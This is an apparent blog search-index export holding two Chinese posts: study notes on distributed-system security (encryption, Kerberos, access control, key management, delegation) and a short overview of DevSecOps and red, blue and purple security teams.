title="控制的焦点"></a>控制的焦点</h2><p><img src="/josyaaa/./image/1-2.png" alt="1-2"></p><ul><li>a方法就是把注意力集中式的对于应用程序相关联的数据保护（数据的完整性）</li><li>b方法就是把注意力集中式的对于访问特定数据或资源时，通过明确指定可以调用的操作以及操作由谁来完成进行保护（控制焦点与访问控制机制相关）</li><li>c方法就是把注意力集中式的对于用户，通过采取一些措施使得只有指定的人可以访问该应用程序，而不考虑其执行的操作来实现（控制焦点在于定义用户的角色）</li></ul><h2 id="安全机制分层"><a href="#安全机制分层" class="headerlink" title="安全机制分层"></a>安全机制分层</h2><p>安全系统设计的一个重要问题就是决定将安全机制放置在哪一层面，如下图所示通用服务与通信服务分离开来，安全机制放置在哪一层面取决于客户对特定层中服务的安全程度所具有的信任度，还是要更具不同软件产品的特定所定制不同的安全机制。</p><p><img src="/josyaaa/./distributed-security/1-3.png" alt="1-3"></p><p>信任服务导致的信任计算库（TCB），TCB是一个分布式系统中所有安全机制的集合，这些机制用于执行一个安全策略，TCB越小越好。</p><h2 id="简洁性"><a href="#简洁性" class="headerlink" title="简洁性"></a>简洁性</h2><p>简单性有助于最终用户对应用程序投入信任，更重要的是使设计者确信系统没有重大的安全漏洞。</p><h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><ul><li>分布式系统的基本安全措施是使用加密技术但是以密文传输消息时存在三种需要我们防止的不同攻击：</li></ul><p><img src="/josyaaa/./distributed-security/1-4.png" alt="1-4"></p><p>1、入侵者通过在发送方或接收方都不知道的情况下进行窃听<br>2、修改经过适当加密的密文则困难的多，因为在进行针对性地修改消息前，入侵者首先必须对该消息进行解密<br>3、入侵者向通信系统中插入加密过的消息</p><ul><li>加密系统之间存在基本的区别是加密与解密密钥是否相同，主要的加密算法如下：<br>1、DES算法（使用分析方法难以破解算法当然使用暴力破解是可以被破解的，但是在一个具有不同密钥的特殊加密-解密-加密模式中三次使用DES更为安全）在被128位的Rijindael算法数据库取代的过程中。<br>2、RSA算法，RSA来自即没有任何已知的方法能够有效的找到大数的素因子，破解RSA的过程其实就是在寻找私钥和公钥的最大素数。<br>3、MD5算法</li></ul><h1 id="安全通道"><a href="#安全通道" class="headerlink" title="安全通道"></a>安全通道</h1><h2 id="分布式系统的安全性本质上是要回归三个主题："><a href="#分布式系统的安全性本质上是要回归三个主题：" class="headerlink" title="分布式系统的安全性本质上是要回归三个主题："></a>分布式系统的安全性本质上是要回归三个主题：</h2><p>1、如何使客户与服务器之间的通信保持安全，安全通信需要对通信各方进行身份认证，同时还要确保消息的完整性和机密性，同时也要考虑保护一组服务器内的通信<br>客户-服务器通信可以认为是在通信各方之间建立一个安全通道问题，保护消息免受窃听确保机密性完成、安全通道可确保入侵者不能窃听其消息</p><p>2、服务器一旦接受来自客户的请求，它将如何查明该客户是否得到授权使请求得以执行<br>身份认证和消息完整性相互之间不能脱离开，要确保进行身份认证之后交换的数据消息的完整性，常见的方法是依靠会话密钥使用密钥加密。会话密钥是一个共享密钥，用于完整性和可能的机密性而对消息进行加密。</p><ul><li><p>基于共享密钥的身份认证（质询-询问协议）<br><img src="/josyaaa/./distributed-security/png8.png" alt="png8"></p></li><li><p>基于密钥分发中心的身份认证（可扩展性）</p></li></ul><p>3、安全通道如何提供对消息完整性和机密性的保证，完整性是保护消息免受修改，机密性是确保消息不能被截获和读取消息。</p><ul><li>消息完整性通常超过安全通道中的实际传输的范畴（a[保证消息不会恶意更改]、b[消息的可溯源记录]）&#x3D;&#x3D;&gt;”数字签名”</li><li>&#x3D;&#x3D;&gt;”会话密钥”即是在身份认证阶段完成后，通信各方一般使用唯一的共享会话密钥实现机密性使用与建立安全通道所用密钥相同的密钥。<br>会话密钥的基本思想就是如果入侵者能够窃听许多使用同一密钥加密的数据，就有可能发动攻击以得到密钥的某些特征，并有可能发现明文或该密钥本身。替代解决方法是在每对组成员之间使用各自的共享密钥，但是使用公钥加密系统可以解决这个问题即每个成员有其自己的（公钥、私钥）对，其中所有成员都可用该公钥发送机密消息。</li></ul><p>4、安全的复制服务器（一个客户向一组复制服务器发出请求）</p><ul><li>这种情况下可能服务器可能已经由于容错性或性能的原因进行了复制但是客户总会希望期望响应具有可信机制。</li><li>类似与byzantine故障的方法：<br>1、收集来自所有服务器的响应并对每个服务器进行身份认证（违反了复制的透明度），安全和透明的复制服务器的本质在于称为秘密共享的特性<br><img src="/josyaaa/./distributed-security/png9.png" alt="png9"></li></ul><h2 id="kerberos安全系统"><a href="#kerberos安全系统" class="headerlink" title="kerberos安全系统"></a>kerberos安全系统</h2><p><img src="/josyaaa/./distributed-security/png10.png" alt="png10"></p><ul><li>身份认证服务器（负责处理来自用户的登陆请求，但是建立安全通道是有TGS处理的）和票据授予服务（服务确信客户正是其所声称的客户）</li></ul><h1 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h1><p>一般情况是一个对象服务器控制很多对象，客户发送的请求一般都包含对特定对象方法的调用，所以这样的请求需要调用具有足够的访问权限。</p><ul><li>检验访问权限为访问控制</li><li>授权是关于授予访问权限</li></ul><h2 id="访问控制中常见的问题"><a href="#访问控制中常见的问题" class="headerlink" title="访问控制中常见的问题"></a>访问控制中常见的问题</h2><p>访问控制的一般模型：<br><img src="/josyaaa/./distributed-security/png11.png" alt="png11"></p><ul><li>访问控制矩阵</li></ul><p><img src="/josyaaa/./distributed-security/png12.png" alt="png12"></p><p>矩阵中的许多项将是空的，因为单个主体一般可以访问相对较少的对象。</p><p>1、让每个对象保存一个希望访问该对象的主体访问权限表，即访问控制表（ACL）<br>2、以行方向分布该矩阵，通过为每个主体赋予一个其对每个对象所拥有的权能列表</p><ul><li>保护域</li></ul><p>通过忽略所有空项，ACL和权能可以有效访问控制矩阵，采取进一步措施ACL或权能列表仍可能变得非常大，所以缩小ACL普通方式就是利用保护域<br>1、构造用户组<br>2、引入分层组<br>3、让访问监控程序完成所有工作的方式，是让每个主体携带一个证书，列出所属的群组（数字签名技术）<br>4、基于角色实现保护域<br>5、基于操作将对象分组</p><h2 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h2><p><img src="/josyaaa/./distributed-security/png13.png" alt="png13"></p><ul><li><p>数据包过滤网关：基于数据包报头中包含的源地址和目的地址制定关于是否传送一个网络数据包的决定</p></li><li><p>应用层网关：仅检查网络数据包报头的数据包过滤网关，实质上是检查防火墙实际出入站的消息内容</p></li><li><p>代理网关：属于应用层网关的变形，作为指定类型的应用程序的前端工作，并确保工作只传送某个准则的消息</p></li></ul><h2 id="安全移动代码"><a href="#安全移动代码" class="headerlink" title="安全移动代码"></a>安全移动代码</h2><ul><li>保护代理<br>Ajanta系统：允许代理程序所有者检测该代理是否被篡改、只追加记录、有选择地揭示某些服务器的状态</li><li>保护目标<br>处理恶意入站代理程序时，仅检测系统资源就已经过于延迟，构建沙箱<br><img src="/josyaaa/./distributed-security/13.png" alt="13"><br>灵活的做法是为下载的移动代码啊创建运动场。运动场是一台专门为运行移动代码保留的单独的指定机器<br><img src="/josyaaa/./distributed-security/14.png" alt="14"></li></ul><p>困难部分是实施安全策略，对Java程序提出了三种机制：<br>1、使用基于作为权能的对象引用<br><img src="/josyaaa/./distributed-security/15.png" alt="15"><br>2、扩展的栈自省<br><img src="/josyaaa/./distributed-security/16.png" alt="16"><br>本质上，栈自省允许对类或方法的特权进行链接，并对每个调用者的那些特权的分别检查。<br>3、名称空间管理<br>为了赋予程序对本地资源的访问权限，首先需要通过加入包含实现那些资源的类的适当文件来获得访问，加入过程要求赋予解释器一个名称，然后将名称解析一个类，随后在运行时加载该类。</p><p>上述所描述的是基于下载程序的来源将特权与类或方法关联起来的方案。依靠Java解释器，通过上面所描述的机制执行安全策略是可能实现的。</p><h2 id="拒绝服务"><a href="#拒绝服务" class="headerlink" title="拒绝服务"></a>拒绝服务</h2><p>DDos攻击中，大量的进程一起试图摧毁一个网络服务。在这些情况下，我们往往可以看到，攻击者已经成功地劫持了一大组机器，而这些机器毫无意识的以及加入攻击的行列中了。<br>1、带宽耗竭攻击：是往某个机器发送大量的消息，正常消息很难到达接收者<br>2、资源耗竭攻击：使接收者把资源消耗在无用的消息上<br><strong><strong>解决方法</strong></strong></p><ul><li>让机器检查所有安装的文件，不停地监视它们的状态</li><li>不断的监视网络流量（把源地址不属于任何企业网络的数据包删除掉，可以防止很多攻击破坏，通常最好把数据包严格地按源地址过滤）</li></ul><h1 id="安全管理"><a href="#安全管理" class="headerlink" title="安全管理"></a>安全管理</h1><p>1、加密密钥的一般管理，尤其公钥的分配方式<br>2、讨论添加当前成员信任的一个新的群组成员来讨论安全管理一组服务器的问题<br>3、考虑权能和称为属性证书的事物来关注授权管理</p><h2 id="密钥管理"><a href="#密钥管理" class="headerlink" title="密钥管理"></a>密钥管理</h2><ul><li>密钥建立<br><img src="/josyaaa/./distributed-security/17-2.png" alt="17-1"></li></ul><p>Diffie-Hellman 密钥原理：<br><img src="/josyaaa/./distributed-security/17.png" alt="17-2"></p><ul><li>密钥分发<br>密钥管理中最困难的部分是初始密钥的实际分发。在对称密钥系统中，初始共享密钥必须沿着一条提供身份认证和机密性的安全通道交流。但是如果没有这条通道，我们就需要创造通信的手段。<br>在使用公钥加密系统的情况下，需要以接收者能够确信该密钥肯定可以与声明的一个私钥配对，也就是说不管公钥还是私钥均需要提供身份认证和机密性的安全通道发送。<br>密钥分发原理结构：<br><img src="/josyaaa/./distributed-security/18-1.png" alt="18-1"><br>公钥分发原理结构：<br><img src="/josyaaa/./distributed-security/18-2.png" alt="18-2"></li></ul><p>注意通过确认证书是处于可用状态下，客户实际上就会相信该证书不是伪造的。但是每个人都信任最高级的证书颁发机构的情景假设下分层信任模型才可以施行。</p><ul><li>证书生存周期<br>证书最重要的问题是其寿命，假设在被标识的实体私钥收到伤害，那么可信的用户减少就意味着没有使用公钥的用户。这样的假设中需要种机制来保证证书的存在有效性。</li></ul><p>吊销证书的方式:<br>1、使用证书颁发机构定期公布分证书吊销表<br>2、限制证书的生存期<br>3、证书的生存期缩短到几乎为零</p><h2 id="安全组管理"><a href="#安全组管理" class="headerlink" title="安全组管理"></a>安全组管理</h2><p>特殊服务机构：KDC、CA等,说明分布式系统中的一个困难问题。首先要说明服务机构必须是可信机构，如何提供服务机构的安全同时兼顾其高可用性。</p><p>解决高可用的方法就是**<strong>copy</strong>**，但是在复制服务器过程中,需要解决是确保进程要求加入组别时，该组别的完整性有无遭受的破坏，因为没有单个的组成员能够破坏证书，所以需要考虑管理一组复制组的方法。</p><h2 id="授权管理"><a href="#授权管理" class="headerlink" title="授权管理"></a>授权管理</h2><ul><li>权能与属性证书</li></ul><p>1、权能是什么？<br>权能是对于指定资源的一种不可伪造的数据结构，它确切指定它的拥有者关于该资源的访问权限。<br>权能时候一个128位的标识符。内部结构如下：</p><table><thead><tr><th>48位</th><th>24位</th><th>8位</th><th>48位</th></tr></thead><tbody><tr><td>服务器端口</td><td>object</td><td>tRights</td><td>Check</td></tr></tbody></table><hr><p>其后的24位用于给定服务器上的对象，服务端口与对象标识符一起位Amoeda中每个对象构成来一个72位的全系统范围的唯一标识符，8位用于指定权能的访问权限，最后48位check字段用于使权能不可伪造。</p><p>生成有限权能的方法：<br><img src="/josyaaa/./distributed-security/19-1.png" alt="19-1"><br>注：本质上f所做的事情与计算消息摘要所做的事情相同。</p><p>改变原始消息中任何内容都会立即检测出来，在现代分布式系统中使用权能的一种概括是属性证书，属性证书由称为属性证书颁发机构的特殊证书颁发机构分发。证书中列出的访问权限由该属性证书颁发机构签名。</p><ul><li>委派</li></ul><p>1、委派的基本思想是什么？<br>通过将某些访问权限从一个进程传送到另一个进程，使得在多个进程间分布工作变得容易，而又不会对资源保护产生明显的影响。<br>2、委派的方式有那些？<br>**代理:**是一个标记，允许其所有者使用与授予该标记的主体相同的或受限的权限和特权进行操作<br><strong>不要想Alice请求:</strong><br><img src="/josyaaa/./distributed-security/19-2.png" alt="19-2"></p><p><em><strong><em><strong>实现安全委派的基本思想是：证明你知道这个秘密</strong></em></strong></em></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DecSecOps and attack team 建设</title>
      <link href="/josyaaa/2022/05/11/deveops/"/>
      <url>/josyaaa/2022/05/11/deveops/</url>
      
        <content type="html"><![CDATA[<hr><figure class="highlight plaintext"><figcaption><span>graph LR</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A[SeaTunnel(多数据源收集)] --&gt;B[DolphinScheduler（工作流定义）]</span><br><span class="line">    B --&gt; C[可视/安全]</span><br><span class="line">    C --&gt;|可见性|D[数据可视化工具 ？]</span><br><span class="line">    C --&gt;|安全性|E[威胁情报提供 ？]</span><br></pre></td></tr></table></figure><hr><h3 id="攻击面管理收藏夹"><a href="#攻击面管理收藏夹" class="headerlink" title="攻击面管理收藏夹"></a>攻击面管理收藏夹</h3><ul><li>splunk</li><li>tenable.io</li><li>servicenow</li><li>jira</li><li>qualys</li></ul><h3 id="适用于ASM的云连接器"><a href="#适用于ASM的云连接器" class="headerlink" title="适用于ASM的云连接器"></a>适用于ASM的云连接器</h3><ul><li>Google cloud</li><li>Aws cloud</li><li>Azure cloud</li></ul><h3 id="FAREMWORK"><a href="#FAREMWORK" class="headerlink" title="FAREMWORK"></a>FAREMWORK</h3><ul><li>多数据源收集器</li><li>SOC中心的应用程序，用于威胁检测</li><li>独立模块与数据库交互的侦察框架</li><li>滲透测试框架</li><li>网络扫描器</li></ul><h3 id="Thired-Party-Developer"><a href="#Thired-Party-Developer" class="headerlink" title="Thired Party Developer"></a>Thired Party Developer</h3><ul><li>EclectionQ  连接顶级威胁情报提供商和集中技术数据源的任务工作流</li><li>Rumble 快速、简单、准确的资产可见性</li></ul><h3 id="搜素引擎"><a href="#搜素引擎" class="headerlink" title="搜素引擎"></a>搜素引擎</h3><ul><li>Censys</li></ul><h3 id="特色"><a href="#特色" class="headerlink" title="特色"></a>特色</h3><ul><li>日志收集（云和本地）</li><li>网络分接头（cpacket）</li><li>编排与自动化（ThreatNexus）</li><li>SSL解密 （F5 SSL）</li><li>第三方威胁情报（confense PhishME）</li></ul><h1 id="Devops-and-DevSecops"><a href="#Devops-and-DevSecops" class="headerlink" title="Devops and DevSecops"></a>Devops and DevSecops</h1><p>DevOps（“开发”和“运营”的组合）是实践和工具的组合，旨在提高组织比传统软件开发流程更快地交付应用程序和服务的能力。这种速度使组织能够更好地为客户服务并在市场上更有效地竞争。简单来说，DevOps 就是要消除传统上孤立的团队、开发和运营之间的障碍。在 DevOps 模型下，开发和运营团队在整个软件应用程序生命周期中协同工作，从开发和测试到部署再到运营。</p><p>DevOps 安全，通常称为 DevSecOps，是指通过策略、策略、流程和技术来保护整个 DevOps 环境的纪律和实践。DevSecOps 理念是，安全性应该构建到 DevOps 生命周期的每个部分，包括启动、设计、构建、测试、发布、支持、维护等。传统的安全从这样的立场出发，即一旦设计了系统，就可以在发布之前确定和纠正其安全缺陷。随着 DevOps 模型的变化，传统的安全实践在开发周期中出现得太晚，并且对于迭代构建的软件的设计和发布来说太慢了。因此，它们可能成为快速交付应用程序和服务的主要障碍。</p><h1 id="Devops-and-DevSecops-value"><a href="#Devops-and-DevSecops-value" class="headerlink" title="Devops and DevSecops value"></a>Devops and DevSecops value</h1><p>借助 DevSecOps，安全成为 DevOps 团队中每个人的关注焦点。DevSecOps 的目标是在不牺牲安全性的情况下快速、大规模地实施安全决策。DevSecOps 涉及发布工程师和安全团队之间持续、灵活的协作。“交付速度”和“构建安全代码”的概念合并为一个简化的流程。安全测试是在迭代中完成的，不会减慢交付周期。关键的安全问题会在它们变得明显时进行处理，而不是在威胁或危害发生后进行处理。</p><h2 id="Red-Blue-Purple"><a href="#Red-Blue-Purple" class="headerlink" title="Red  Blue  Purple"></a>Red  Blue  Purple</h2><ul><li>红队</li></ul><p>红队进行滲透测试和漏洞评估，常见任务：</p><ol><li>滲透测试</li><li>漏洞评估</li><li>社会工程学</li></ol><ul><li>蓝队</li></ul><p>构建和维护组织防御的同时响应事件，常见任务；</p><ol><li>风险情报数据分析</li><li>事件响应</li><li>安全监控</li><li>逆向工程</li></ol><ul><li>紫队</li></ul><p>紫色团队被设计为红色和蓝色团队之间的反馈桥梁，将他们的方法修改为更主动、更直接，最终在组织的整体安全态势方面更有效<br>红队建议如何优先考虑漏洞管理和修补关键缺陷，而蓝队则监控红队，并分享对红队活动和测试的见解，以发现系统中更深层次的弱点</p><h1 id="它如何从紫色团队中受益"><a href="#它如何从紫色团队中受益" class="headerlink" title="它如何从紫色团队中受益"></a>它如何从紫色团队中受益</h1><ul><li>更有效漏洞检测</li></ul><p>有时攻击者绕过所有防御可能会发生破坏，而蓝队甚至没有注意到它的发生。这并不一定表明蓝队缺乏技能或技术，而是攻击者技术的复杂性或攻击向量的复杂性，紫队的存在就是为了消除这种可能性。红色和蓝色团队一起工作意味着参与不断的知识转移和模拟现实生活中的攻击场景。这样，红队将加强组织的漏洞管理流程，而蓝队将进入攻击者的思维模式，以开发更好的事件响应程序和漏洞检测流程。</p><ul><li>更健康网络安全文化</li></ul><p>正如我们之前所说，红队和蓝队的目标都是改善组织的安全防御，就像组织的目标是培养健康的公司网络安全文化一样。紫色组队，第一个激励很强，攻防之间经常沟通，信息源源不断，工作共生。同样，紫色团队不一定是新组建的团队，它可以作为两个现有团队之间的练习。重要的是鼓励团队成员之间的沟通和协作，以促进组织网络安全文化的不断改进。</p><ul><li>更好安全态势</li></ul><p>如果没有紫色团队的持续沟通、定期安全审计、新防御技术、威胁追踪、漏洞管理以及改进安全基础设施和策略的开发，组织将无法抵御恶意行为者。</p><h1 id="它在实践中需要注意"><a href="#它在实践中需要注意" class="headerlink" title="它在实践中需要注意"></a>它在实践中需要注意</h1><ol><li><p>协作和沟通是关键，虽然两个团队分享他们的发现并互相帮助很重要，但你永远不应该期望红队参与完整的漏洞管理过程，也不要让蓝队作为专家黑客负责。</p></li><li><p>您是否正在致力于改进安全警报或安全策略和流程？您是否正在验证您的员工能够在多大程度上保护自己免受社会工程的侵害？</p></li><li><p>在渗透测试、安全审计或漏洞评估期间是否发生了您想要纠正或修改的任何事情？</p></li><li><p>在实施这些安全补救措施之前，请进行修改和验证。更好的是，跟踪每一步，在进行下一步之前评估每一项任务，并始终跟进。</p></li><li><p>反复检查每一个缓解和修复将允许双方相互学习更多，帮助缩小任何差距，并允许优先的补救指导方针。这将关注重复性弱点较少的红队，并引导蓝队寻找更复杂的威胁。</p></li></ol>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
